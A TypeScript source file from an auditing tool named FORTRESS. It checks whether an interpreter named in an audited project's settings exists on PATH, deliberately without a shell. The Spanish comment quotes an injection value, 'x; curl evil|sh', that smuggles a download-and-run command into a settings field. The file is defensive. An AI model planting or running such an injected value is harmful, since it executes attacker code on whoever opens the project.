import { accessSync, constants } from 'node:fs'
import { join } from 'node:path'

/**
 * Si un binario se puede ejecutar: la semantica de `command -v`, SIN shell.
 *
 * SIN SHELL A PROPOSITO, y esto es la parte de seguridad de la pieza. El nombre
 * sale del `.claude/settings.json` de un proyecto AUDITADO —codigo ajeno, a
 * veces hostil, que es el caso de uso entero de FORTRESS—. Pasarlo por
 * `sh -c "command -v $x"` seria ejecucion de comandos arbitrarios desde el repo
 * del cliente: bastaba con escribir `"command": "x; curl evil|sh"` en su settings
 * para que el simple hecho de ABRIR el proyecto lo ejecutara. La comprobacion se
 * hace recorriendo el PATH con `access(X_OK)`, que no interpreta nada.
 *
 * Es ademas el mismo criterio que usa el CLI al arrancar el hook, asi que la
 * respuesta no es una aproximacion: si esto dice que no esta, el hook no arranca.
 *
 * LIMITE HONESTO: un interprete con barra (`./bin/py`) se resuelve contra el
 * proceso, no contra el proyecto. No se ha visto ninguno —los dos settings
 * reales usan nombres pelados— y adivinar la base correcta sin medirla seria
 * inventar; cuando aparezca uno, se mide y se decide.
 */
export function interpreteExiste(binario: string, path = process.env.PATH ?? ''): boolean {
  if (binario === '' || binario.includes('\0')) return false
  if (binario.includes('/')) return ejecutable(binario)

  return path
    .split(':')
    .filter((dir) => dir !== '')
    .some((dir) => ejecutable(join(dir, binario)))
}

function ejecutable(ruta: string): boolean {
  try {
    accessSync(ruta, constants.X_OK)
    return true
  } catch {
    return false
  }
}
